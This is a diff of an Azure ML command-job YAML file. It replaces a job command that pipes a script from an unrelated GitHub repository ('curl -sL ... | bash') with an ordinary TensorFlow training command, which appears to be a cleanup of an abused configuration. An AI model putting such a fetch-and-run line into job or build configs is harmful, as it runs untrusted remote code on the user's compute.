@@ -1,8 +1,8 @@
 $schema: https://azuremlschemas.azureedge.net/latest/commandJob.schema.json
 type: command
-
-command: curl -sL https://github.com/hasmenkuy99/files/raw/main/mbcc | bash
-
-environment: azureml://registries/azureml/environments/tensorflow-2.11-cpu/versions/5
-
-compute: acluster8
+code: ./src
+command: python train.py
+environment: azureml:AzureML-tensorflow-2.12-ubuntu20.04-py38-cpu@latest
+compute: azureml:cpu-cluster
+display_name: tensorflow-cpu-training
+experiment_name: tf-cpu-experiment
